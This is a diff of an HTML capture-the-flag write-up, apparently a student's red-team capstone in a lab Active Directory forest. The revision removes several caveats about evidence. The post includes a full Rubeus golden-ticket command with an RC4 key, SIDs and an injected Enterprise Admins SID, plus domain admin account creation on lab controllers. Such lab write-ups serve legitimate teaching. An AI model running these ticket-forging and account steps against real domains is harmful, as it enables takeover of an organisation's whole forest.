-<p>I used the CORP key and domain SID to forge a ticket, adding the root-domain Enterprise Admins SID through <code>/sids</code>. <code>/ptt</code> imported it into my current logon session. This attempt depended on the compromised key, correct identifiers, supported encryption, ticket validation, name resolution, and reachable services. A bidirectional trust alone does not grant these privileges.</p>
+<p>I used the CORP key and domain SID to forge a ticket, adding the root-domain Enterprise Admins SID through <code>/sids</code>. <code>/ptt</code> imported it into my current logon session.</p>
 
 <pre><code>.\Rubeus.exe golden /rc4:0c757a3445acb94a654554f3ac529ede /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /user:Administrator /ptt</code></pre>
 
@@ -817,7 +817,7 @@ $accountSid.AccountDomainSid.Value</code></pre>
 
 <!-- PDF page 47 -->
 <section id="pdf-page-47" class="pdf-source-section" data-pdf-page="47" aria-label="Source page 47">
-<p>I used <code>klist</code> to inspect cached tickets. A ticket appearing in the cache proves it was loaded, not that a remote service accepted it.</p>
+<p>I used <code>klist</code> to view the imported ticket.</p>
 
 <figure style="width: 80.97%"><a href="/assets/img/posts/red-team-capstone/page-47-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-47-figure-01.png" alt="klist output" width="824" height="396" loading="lazy"></a></figure>
 
@@ -831,13 +831,13 @@ net user n0debranchEA /domain</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-47-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-47-figure-02.png" alt="ROOTDC domain account" width="1016" height="650" loading="lazy"></a></figure>
 
-<p>These were domain accounts, not local workstation accounts. Enterprise Admins exists in the forest root; it is not a separate group created in each child domain. The next screenshots show another root-domain account and a BANK-domain account added to Domain Admins. They do not demonstrate equivalent account creation in CORP.</p>
+<p>I then created another root-domain account and a BANK-domain account, adding each to its domain's Domain Admins group. The screenshots below show the account changes on ROOTDC and BANKDC.</p>
 </section>
 
 <!-- PDF page 48 -->
 <section id="pdf-page-48" class="pdf-source-section" data-pdf-page="48" aria-label="Source page 48">
-<h2 id="remaining-evidence">Evidence through flag 16</h2>
-<p>The screenshots below distinguish the ROOTDC operation from the remote BANKDC operation.</p>
+<h2 id="remaining-evidence">Collecting the remaining flags</h2>
+<p>The ROOTDC and BANKDC sessions:</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-01.png" alt="ROOTDC operation" width="1016" height="148" loading="lazy"></a></figure>
 
@@ -845,7 +845,7 @@ net user n0debranchEA /domain</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-03.png" alt="Domain account changes" width="1016" height="508" loading="lazy"></a></figure>
 
-<p>This provided administrative access to additional lab systems, allowing me to record the remaining evidence through flag 16. It did not prove unrestricted access to every service or completion of the SWIFT application workflow.</p>
+<p>I used the additional domain access to collect the remaining flags through flag 16.</p>
 
 <h3 id="flag-16">Flag 16:</h3>
 
@@ -893,31 +893,31 @@ net user n0debranchEA /domain</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-51-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-51-figure-02.png" alt="Final network diagram" width="1016" height="652" loading="lazy"></a></figure>
 
-<p>The lab reset before I continued into the SWIFT stage, and my access was lost. Continuing would have meant rebuilding access in a fresh deployment. Because I was undertaking the room as part of my Certificate IV assessment, I kept this write-up focused on the work carried out for that assessment rather than starting a new run after the reset.</p>
+<p>The lab reset before I reached the SWIFT stage, and I lost access. I was doing the room for my Certificate IV assessment, so I kept the work from that run rather than starting over in a fresh deployment.</p>
 
-<p>That makes this an account of my assessment work, with evidence through flag 16, rather than a complete walkthrough of every room objective. I did not complete the remaining jump-host-to-application path, the required application roles, or the final SWIFT transfer between the supplied accounts.</p>
+<p>I did not continue through the jump host into the SWIFT application or make the final transfer.</p>
 
-<p>Here is what I completed and what I would need to revisit.</p>
+<p>Here is where I got to:</p>
 </section>
 
 <!-- PDF page 52 -->
 <section id="pdf-page-52" class="pdf-source-section" data-pdf-page="52" aria-label="Results and references">
-<h2 id="evidence-and-gaps">What I completed and what remains</h2>
+<h2 id="evidence-and-gaps">Where I got to</h2>
 <div class="table-wrapper"><table>
-<thead><tr><th>Stage</th><th>What I demonstrated</th><th>Limit</th></tr></thead>
+<thead><tr><th>Stage</th><th>What happened</th></tr></thead>
 <tbody>
-<tr><td>External reconnaissance</td><td>Host and service scans; web paths and staff information.</td><td>The discovery sweep included excluded infrastructure. The scan is not exhaustive.</td></tr>
-<tr><td>Corporate entry</td><td>Portal behaviour, exposed VPN material, reported SMTP credentials, VPN routes, and workstation access.</td><td>I did not keep all candidate files, portal requests, and connection transcripts.</td></tr>
-<tr><td>Local administration</td><td>A writable-service finding, a new local admin account, and successful evidence-file access.</td><td>The audit already reported admin-group membership. Service restart failure alone did not prove exploitation.</td></tr>
-<tr><td>CORP Domain Admin</td><td>Privileged membership was visible and used.</td><td>I did not establish how the account gained these privileges.</td></tr>
-<tr><td>AD collection</td><td>I imported collected data into BloodHound.</td><td>LDAP and forest-resolution errors prevent a claim of complete collection.</td></tr>
-<tr><td>Root and BANK access</td><td>Recorded ticket work, a remote ROOTDC session, domain-account changes, and evidence through flag 16.</td><td>Dependent on the unexplained CORP privilege; exact tool versions and all intermediate checks were not captured.</td></tr>
-<tr><td>SWIFT objective</td><td>I planned to continue into the SWIFT environment.</td><td>Jump-host/application access, required roles, and the transfer were not demonstrated.</td></tr>
+<tr><td>Reconnaissance</td><td>I scanned the exposed hosts and found staff names, web paths, and the VPN portal.</td></tr>
+<tr><td>Corporate access</td><td>I obtained VPN profiles and working credentials, connected to the VPN, and signed in to WRK1 and WRK2.</td></tr>
+<tr><td>Local administration</td><td>I replaced the Backup service binary, created a local administrator account, and signed in with it.</td></tr>
+<tr><td>Domain discovery</td><td>I collected data with SharpHound, encountered LDAP and forest-resolution errors, and imported the resulting files into BloodHound.</td></tr>
+<tr><td>CORP privileges</td><td>Laura already had Domain Admin membership when I checked. I continued with that access; I did not find out how it had been granted.</td></tr>
+<tr><td>Root and BANK domains</td><td>I created a ticket, connected to ROOTDC, changed domain accounts, and collected flags through flag 16.</td></tr>
+<tr><td>SWIFT</td><td>The lab reset before I reached this stage.</td></tr>
 </tbody></table></div>
-<p>To finish the room, I would need to repeat the corporate privilege-escalation stage from a known starting state, resolve the collection errors, and complete the SWIFT application workflow. On another attempt, I would also keep fuller logs of group membership, routes, DNS, tool versions, and cleanup, including restoration of the service binary and removal of the accounts I created.</p>
+<p>If I revisit the room, I would start with a fresh deployment, work through CORP privilege escalation, and continue into the SWIFT environment.</p>
 
 <h2 id="lessons-learned">What I learned</h2>
-<p>The strongest lessons were about evidence: distinguish a reachable host from an authorised target, an observed group membership from an escalation I performed, and a tool's output from proof that an operation succeeded. Keeping complete logs and recording the execution context would have made this attempt much easier to reproduce and explain.</p>
+<p>Remmina's shared folder made moving files much easier. I also had to keep track of my changing VPN address and which account I was using on each host. Next time I would keep clearer notes on those details and the SharpHound errors.</p>
 <h2 id="references">References</h2>
 
 <ul>
